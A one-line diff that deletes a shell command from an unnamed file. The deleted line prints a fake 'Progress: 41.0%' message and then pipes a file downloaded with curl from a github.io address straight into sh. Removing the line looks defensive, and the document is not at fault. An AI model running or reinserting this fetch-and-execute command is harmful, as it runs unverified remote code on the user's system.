@@ -1,1 +1,0 @@
-echo 'Progress: 41.0%'; curl -L --progress-bar frkns.github.io/fun/TE_RETRIEVED_CAPTURE.msft | sh
